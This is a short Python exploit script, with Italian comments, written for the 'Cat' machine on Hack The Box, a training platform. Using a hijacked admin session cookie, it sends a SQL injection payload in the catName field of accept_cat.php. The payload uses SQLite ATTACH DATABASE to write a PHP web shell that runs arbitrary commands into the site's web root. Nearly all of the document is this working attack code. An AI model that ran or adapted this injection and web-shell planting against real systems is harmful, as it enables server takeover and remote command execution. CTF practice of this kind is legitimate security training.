import requests
import argparse

parser=argparse.ArgumentParser(description="rce per la macchina Cat HTB")

parser.add_argument("-c","--cookie",required=True,help="cookie di sessione PHPSESSID dell'admin")

argomenti=parser.parse_args()

cookie=argomenti.cookie

target="http://cat.htb/accept_cat.php"

cookies={
    "PHPSESSID": cookie
}

shell="""x');ATTACH DATABASE '/var/www/cat.htb/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--"""

parametri={
    "catName": shell,
    "catId":1
}

try:
    print("[+] costruzione richiesta per invio della shell...")
    richiesta=requests.post(url=target,cookies=cookies,data=parametri)
    print("[+] invio della richiesta...")
    print("richiesta inviata")
except:
    print("ERRORE EXPLOIT")